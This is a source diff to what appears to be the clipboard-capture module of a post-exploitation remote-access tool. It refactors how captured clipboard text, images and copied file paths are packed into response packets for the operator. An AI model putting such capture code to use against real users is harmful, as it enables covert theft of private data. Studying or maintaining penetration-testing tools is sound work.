@@ -339,47 +339,32 @@ VOID timestamp_to_string(SYSTEMTIME* pTime, char buffer[40])
 VOID dump_clipboard_capture(Packet* pResponse, ClipboardCapture* pCapture, BOOL bCaptureImageData)
 {
 	ClipboardFile* pFile;
-	Tlv entries[4];
+	Packet* group = packet_create_group();
+	TlvType groupType;
+	Packet* file = NULL;
 	char timestamp[40];
 
 	dprintf("[EXTAPI CLIPBOARD] Dumping clipboard capture");
 
-	memset(entries, 0, sizeof(entries));
 	memset(timestamp, 0, sizeof(timestamp));
 
 	timestamp_to_string(&pCapture->stCaptureTime, timestamp);
-	entries[0].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_TIMESTAMP;
-	entries[0].header.length = lstrlenA(timestamp) + 1;
-	entries[0].buffer = (PUCHAR)timestamp;
+	packet_add_tlv_string(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_TIMESTAMP, timestamp);
 	dprintf("[EXTAPI CLIPBOARD] Timestamp added: %s", timestamp);
 
 	switch (pCapture->captureType)
 	{
 	case CapText:
 		dprintf("[EXTAPI CLIPBOARD] Dumping text %s", pCapture->lpText);
-		entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT;
-		entries[1].buffer = (PUCHAR)(pCapture->lpText ? pCapture->lpText : "(null - clipboard was cleared)");
-		entries[1].header.length = lstrlenA((char*)entries[1].buffer) + 1;
-
-		packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT, entries, 2);
-		dprintf("[EXTAPI CLIPBOARD] Text added to packet");
+		packet_add_tlv_string(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT_CONTENT, (PUCHAR)(pCapture->lpText ? pCapture->lpText : "(null - clipboard was cleared)"));
+		groupType = TLV_TYPE_EXT_CLIPBOARD_TYPE_TEXT;
 		break;
 	case CapImage:
 		dprintf("[EXTAPI CLIPBOARD] Dumping image %ux%x", pCapture->lpImage->dwWidth, pCapture->lpImage->dwHeight);
-		entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMX;
-		entries[1].header.length = sizeof(DWORD);
-		entries[1].buffer = (PUCHAR)&pCapture->lpImage->dwWidth;
-
-		entries[2].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMY;
-		entries[2].header.length = sizeof(DWORD);
-		entries[2].buffer = (PUCHAR)&pCapture->lpImage->dwHeight;
-
-		entries[3].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DATA;
-		entries[3].header.length = pCapture->lpImage->dwImageSize;
-		entries[3].buffer = (PUCHAR)pCapture->lpImage->lpImageContent;
-
-		packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG, entries, bCaptureImageData && pCapture->lpImage->lpImageContent ? 4 : 3);
-		dprintf("[EXTAPI CLIPBOARD] Image added to packet");
+		packet_add_tlv_uint(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMX, pCapture->lpImage->dwWidth);
+		packet_add_tlv_uint(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DIMY, pCapture->lpImage->dwHeight);
+		packet_add_tlv_raw(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG_DATA, pCapture->lpImage->lpImageContent, pCapture->lpImage->dwImageSize);
+		groupType = TLV_TYPE_EXT_CLIPBOARD_TYPE_IMAGE_JPG;
 		break;
 	case CapFiles:
 		pFile = pCapture->lpFiles;
@@ -387,25 +372,25 @@ VOID dump_clipboard_capture(Packet* pResponse, ClipboardCapture* pCapture, BOOL 
 		while (pFile)
 		{
 			dprintf("[EXTAPI CLIPBOARD] Dumping file %p", pFile);
+			file = packet_create_group();
 
 			dprintf("[EXTAPI CLIPBOARD] Adding path %s", pFile->lpPath);
-			entries[1].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME;
-			entries[1].header.length = lstrlenA(pFile->lpPath) + 1;
-			entries[1].buffer = (PUCHAR)pFile->lpPath;
+			packet_add_tlv_string(file, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_NAME, pFile->lpPath);
 
 			dprintf("[EXTAPI CLIPBOARD] Adding size %llu", htonq(pFile->qwSize));
-			entries[2].header.type = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE;
-			entries[2].header.length = sizeof(QWORD);
-			entries[2].buffer = (PUCHAR)&pFile->qwSize;
+			packet_add_tlv_qword(file, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE_SIZE, pFile->qwSize);
 
 			dprintf("[EXTAPI CLIPBOARD] Adding group");
-			packet_add_tlv_group(pResponse, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE, entries, 3);
+			packet_add_group(group, TLV_TYPE_EXT_CLIPBOARD_TYPE_FILE, file);
 
 			pFile = pFile->pNext;
 			dprintf("[EXTAPI CLIPBOARD] Moving to next");
 		}
+		groupType = TLV_TYPE_EXT_CLIPBOARD_TYPE_FILES;
 		break;
 	}
+
+	packet_add_group(pResponse, groupType, group);
 }
 
 /*!
@@ -635,8 +620,8 @@ DWORD capture_clipboard(BOOL bCaptureImageData, ClipboardCapture** ppCapture)
 					pCapture->captureType = CapImage;
 					pCapture->lpImage = (ClipboardImage*)malloc(sizeof(ClipboardImage));
 					memset(pCapture->lpImage, 0, sizeof(ClipboardImage));
-					pCapture->lpImage->dwWidth = htonl(lpBI->bmiHeader.biWidth);
-					pCapture->lpImage->dwHeight = htonl(lpBI->bmiHeader.biHeight);
+					pCapture->lpImage->dwWidth = lpBI->bmiHeader.biWidth;
+					pCapture->lpImage->dwHeight = lpBI->bmiHeader.biHeight;
 
 					// throw together a basic guess for this, it doesn't have to be exact.
 					pCapture->dwSize = lpBI->bmiHeader.biWidth * lpBI->bmiHeader.biHeight * 4;
